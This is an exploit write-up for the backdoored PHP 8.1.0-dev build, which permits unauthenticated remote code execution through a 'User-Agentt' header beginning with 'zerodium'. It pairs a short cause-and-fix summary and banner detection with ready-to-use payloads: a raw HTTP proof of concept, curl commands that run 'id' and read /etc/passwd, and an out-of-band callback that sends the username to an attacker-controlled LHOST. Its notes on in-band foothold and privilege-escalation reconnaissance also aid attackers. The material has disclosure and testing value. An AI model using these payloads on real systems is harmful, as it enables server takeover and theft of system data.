# PHP 8.1.0-dev - Backdoored release (git.php.net supply-chain) - unauth RCE via User-Agentt header

**Cause:** On 28 March 2021 two malicious commits were pushed to the upstream php-src git repository and briefly tagged into the `8.1.0-dev` build. The backdoor code reads the `User-Agentt` request header (note the double `t`, distinct from the standard `User-Agent`) and, when its value begins with the token `zerodium`, passes everything after the first 8 bytes to `zend_eval_string()` - executing it as PHP with the privileges of the web process. **Fix:** the commits were reverted upstream within hours; never run a `-dev` PHP build in production. Upgrade to any released (non `-dev`) PHP version. **Class:** RCE (unauthenticated, request-header injection; same channel class as Shellshock).

## Detection

The server response banner discloses the vulnerable build:

```http
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
```

Any `-dev`-suffixed PHP banner should be treated as a candidate; the backdoor is specific to the poisoned `8.1.0-dev` tag.

## PoC

```http
GET /index.php HTTP/1.1
Host: TARGET
User-Agentt: zerodiumsystem("id");


```

The evaluated string is the header value minus its first 8 bytes (`zerodium`), so `zerodiumsystem("id");` evaluates the PHP `system("id");`. The command output is prepended to the normal HTML body (read in-band, no reverse shell required).

## curl

```bash
curl -s http://TARGET/index.php -H 'User-Agentt: zerodiumsystem("id");'
```

**Response:** the output of `id` (e.g. `uid=1000(...) gid=1000(...)`) appears ABOVE the page's `<!DOCTYPE html>`. To drive further objectives, swap the command:

```bash
# read a file in-band
curl -s http://TARGET/index.php -H 'User-Agentt: zerodiumsystem("cat /etc/passwd");'
# out-of-band callback (blind confirmation)
curl -s http://TARGET/index.php -H 'User-Agentt: zerodiumsystem("curl http://LHOST/$(id -un)");'
```

## Negative control (mandatory)

The identical request sent with a normal single-`t` `User-Agent` header MUST NOT execute the command. This proves the double-`t` backdoor code path rather than an unrelated injection:

```bash
curl -s http://TARGET/index.php -H 'User-Agent: zerodiumsystem("id");'   # no command output, plain page only
```

## Notes

1. The injection channel is a request HEADER, not a query or body parameter, so generic parameter-fuzzing will not surface it - the only tell is the `-dev` banner.
2. Everything (foothold, local recon, privilege-escalation reconnaissance, file reads) can be performed in-band through the header; a reverse shell is only needed for interactive work and is the loudest step.
3. `zerodiumsystem(...)` calls PHP `system()`; `zerodium\`id\`` / `zerodiumphpinfo();` and other PHP expressions work equally since the payload is passed to `zend_eval_string()`.

**Ref:** https://news-web.php.net/php.internals/113838 (php.internals "Changes to Git commit workflow") ; Exploit-DB 49933 (PHP 8.1.0-dev Backdoor Remote Code Execution)
